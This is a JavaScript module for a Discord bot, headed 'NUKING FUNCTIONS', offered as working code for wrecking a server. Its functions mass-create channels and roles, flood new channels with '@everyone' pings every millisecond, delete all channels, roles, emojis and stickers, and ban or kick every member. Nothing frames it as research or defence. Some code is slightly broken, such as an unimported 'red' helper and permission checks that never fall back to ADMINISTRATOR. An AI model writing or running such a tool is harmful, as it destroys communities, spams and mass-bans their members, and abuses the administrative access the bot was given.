const { Message } = require('discord.js'),
    { greenBright } = require('chalk')

let permissions = {
    channelPerms: false,
    banPerms: false,
    kickPerms: false,
    rolePerms: false,
    emotePerms: false,
}

/**
 * Checks and changes permissions
 * @param {Message} message The initial message
 */
function checkPermissions(message) {
    const mePermissions = message.guild.me.permissions
    permissions = {
        channelPerms: mePermissions.has('MANAGE_CHANNELS' || 'ADMINISTRATOR'),
        banPerms: mePermissions.has('BAN_MEMBERS' || 'ADMINISTRATOR'),
        kickPerms: mePermissions.has('KICK_MEMBERS' || 'ADMINISTRATOR'),
        rolePerms: mePermissions.has('MANAGE_ROLES' || 'ADMINISTRATOR'),
        emotePerms: mePermissions.has(
            'MANAGE_EMOJIS_AND_STICKERS' || 'ADMINISTRATOR'
        ),
    }
}

/// NUKING FUNCTIONS

/**
 * Excessive amount of channels
 * @param {Message} message The initial message
 * @param {number} amount Amount of channels to mass create
 * @param {string} channelName Name of channel
 */
function MassChannels(message, amount, channelName) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!amount)
            return reject(
                'Unspecified Args: Specify the amount you wish to mass channels'
            )
        if (isNaN(amount))
            return reject('Type Error: Use a number for the amout')
        if (amount > 500)
            return reject(
                'Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500'
            )
        if (!permissions.channelPerms)
            return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'")
        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break
            if (!channelName) {
                message.guild.channels
                    .create(`${message.author.username} was here`, {
                        type: 'GUILD_TEXT',
                    })
                    .catch((err) => {
                        console.log(red('Error Found: ' + err))
                    })
            } else {
                message.guild.channels
                    .create(channelName, { type: 'GUILD_TEXT' })
                    .catch((err) => {
                        console.log(red('Error Found: ' + err))
                    })
            }
        }
        resolve()
    })
}

/**
 * Excessive amount of channels and mentions
 * @param {Message} message The initial message
 * @param {number} amount Amount of channels to mass create
 * @param {string} channelName Name of channel
 * @param {string} pingMessage Message to be sent when everyone is mentioned
 */
function MassChnPing(message, amount, channelName, pingMessage) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!amount)
            return reject(
                'Unspecified Args: Specify the amount you wish to mass channels'
            )
        if (isNaN(amount))
            return reject('Type Error: Use a number for the amout')
        if (amount > 500)
            return reject(
                'Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500'
            )
        if (!permissions.channelPerms)
            return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'")
        if (!pingMessage)
            return reject(
                'Unspecified Args: Specify the message you wish to mass mention'
            )
        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size === 500) break
            if (!channelName) {
                message.guild.channels
                    .create(`${message.author.username} was here`, {
                        type: 'GUILD_TEXT',
                    })
                    .catch((err) => {
                        console.log(red('Error Found: ' + err))
                    })
                    .then((ch) => {
                        setInterval(() => {
                            ch.send('@everyone ' + pingMessage)
                        }, 1)
                    })
            } else {
                message.guild.channels
                    .create(channelName, { type: 'GUILD_TEXT' })
                    .catch((err) => {
                        console.log(red('Error Found: ' + err))
                    })
                    .then((ch) => {
                        setInterval(() => {
                            ch.send('@everyone ' + pingMessage)
                        }, 1) // literally not possible but lol?
                    })
            }
        }
        resolve()
    })
}

/**
 * Deletes all channels in a guild
 * @param {Message} message The initial message
 */
function DelAllChannels(message) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!permissions.channelPerms)
            return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'")
        message.guild.channels.cache.forEach((ch) =>
            ch.delete().catch((err) => {
                console.log(red('Error Found: ' + err))
            })
        )
        resolve()
    })
}

/**
 * Excessive amount of roles
 * @param {Message} message The initial message
 * @param {number} amount Amount of roles
 * @param {string} roleName Role name
 */
function MassRoles(message, amount, roleName) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!amount)
            return reject(
                'Unspecified Args: Specify the amount you wish to mass roles'
            )
        if (isNaN(amount))
            return reject('Type Error: Use a number for the amout')
        if (!permissions.rolePerms)
            return reject("Bot Missing Permissions: 'MANAGE_ROLES'")
        for (let i = 0; i <= amount; i++) {
            if (message.guild.roles.cache.size === 250) break
            if (!roleName) {
                message.guild.roles
                    .create({
                        name: 'nuked',
                        color: 'RANDOM',
                        position: i++,
                    })
                    .catch((err) => {
                        console.log(red('Error Found: ' + err))
                    })
            } else {
                message.guild.roles
                    .create({
                        name: roleName,
                        color: 'RANDOM',
                        position: i++,
                    })
                    .catch((err) => {
                        console.log(red('Error Found: ' + err))
                    })
            }
        }
    })
}

/**
 * Deletes all roles
 * @param {Message} message The initial message
 */
function DelAllRoles(message) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!permissions.rolePerms)
            return reject("Bot Missing Permissions: 'MANAGE_ROLES'")
        message.guild.roles.cache.forEach((r) =>
            r.delete().catch((err) => {
                console.log(red('Error Found: ' + err))
            })
        )
    })
}

/**
 * Deletes all emotes
 * @param {Message} message The initial message
 */
function DelAllEmotes(message) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!permissions.emotePerms)
            return reject(
                "Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'"
            )
        message.guild.emojis.cache.forEach((e) =>
            e.delete().catch((err) => {
                console.log(red('Error Found: ' + err))
            })
        )
    })
}

/**
 * Deletes all stickers
 * @param {Message} message The initial message
 */
function DelAllStickers(message) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!permissions.emotePerms)
            return reject(
                "Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'"
            )
        message.guild.stickers.cache.forEach((s) =>
            s.delete().catch((err) => {
                console.log(red('Error Found: ' + err))
            })
        )
    })
}

/**
 * Ban all guild Members
 * @param {Message} message The initial message
 */
function BanAll(message) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!permissions.banPerms)
            return reject("Bot Missing Permissions: 'BAN_MEMBERS'")
        let arrayOfIDs = message.guild.members.cache.map((user) => user.id)
        message.reply('Found ' + arrayOfIDs.length + ' users.').then((msg) => {
            setTimeout(() => {
                msg.edit('Banning...')
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i]
                    const member = message.guild.members.cache.get(user)
                    member
                        .ban()
                        .catch((err) => {
                            console.log(red('Error Found: ' + err))
                        })
                        .then(() => {
                            console.log(
                                greenBright(`${member.user.tag} was banned.`)
                            )
                        })
                }
            }, 2000)
        })
    })
}

/**
 * Kick all guild Members
 * @param {Message} message The initial message
 */
function KickAll(message) {
    checkPermissions(message)
    return new Promise((resolve, reject) => {
        if (!permissions.kickPerms)
            return reject("Bot Missing Permissions: 'KICK_MEMBERS'")
        let arrayOfIDs = message.guild.members.cache.map((user) => user.id)
        message.reply('Found ' + arrayOfIDs.length + ' users.').then((msg) => {
            setTimeout(() => {
                msg.edit('Banning...')
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i]
                    const member = message.guild.members.cache.get(user)
                    member
                        .kick()
                        .catch((err) => {
                            console.log(red('Error Found: ' + err))
                        })
                        .then(() => {
                            console.log(
                                greenBright(`${member.user.tag} was kicked.`)
                            )
                        })
                }
            }, 2000)
        })
    })
}

module.exports = {
    MassChannels,
    DelAllChannels,
    MassChnPing,
    MassRoles,
    DelAllRoles,
    DelAllStickers,
    DelAllEmotes,
    BanAll,
    KickAll,
}
